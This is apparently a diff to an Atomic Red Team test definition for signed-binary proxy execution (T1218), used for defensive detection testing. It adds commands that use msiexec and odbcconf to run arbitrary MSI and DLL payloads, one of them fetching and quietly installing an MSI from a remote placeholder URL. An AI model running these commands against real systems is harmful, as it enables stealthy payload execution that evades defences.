@@ -14,7 +14,7 @@ atomic_tests:
     dll_payload:
       description: DLL to inject
       type: Path
-      default: C:\AtomicRedTeam\atomics\T1218\src\x64\T1218.dll
+      default: PathToAtomicsFolder\T1218\src\x64\T1218.dll
     process_id:
       description: PID of process receiving injection
       type: string
@@ -53,8 +53,77 @@ atomic_tests:
     dll_payload:
       description: DLL to execute
       type: Path
-      default: C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll
+      default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
   executor:
     name: command_prompt
     command: |
      C:\Windows\SysWow64\Register-CimProvider.exe -Path #{dll_payload} 
+
+- name: Msiexec.exe - Execute Local MSI file 
+  description: |
+    Execute arbitrary MSI file. Commonly seen in application installation.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    msi_payload:
+      description: MSI file to execute
+      type: Path
+      default: PathToAtomicsFolder\T1218\src\Win32\T1218.msi
+  executor:
+    name: command_prompt
+    command: |
+     msiexec.exe /q /i "#{msi_payload}" 
+
+- name: Msiexec.exe - Execute Remote MSI file 
+  description: |
+    Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    msi_payload:
+      description: MSI file to execute
+      type: String
+      default: http://site.com/file.msi
+  executor:
+    name: command_prompt
+    command: |
+     msiexec.exe /q /i "#{msi_payload}" 
+
+- name: Msiexec.exe - Execute Arbitrary DLL 
+  description: |
+    Execute arbitrary DLL file stored locally. Commonly seen in application installation.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    dll_payload:
+      description: DLL to execute
+      type: Path
+      default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+  executor:
+    name: command_prompt
+    command: |
+     msiexec.exe /y "#{dll_payload}" 
+
+- name: Odbcconf.exe - Execute Arbitrary DLL 
+  description: |
+    Execute arbitrary DLL file stored locally.
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    dll_payload:
+      description: DLL to execute
+      type: Path
+      default: PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll
+  executor:
+    name: command_prompt
+    command: |
+     odbcconf.exe /S /A {REGSVR "#{dll_payload}"}
+ 
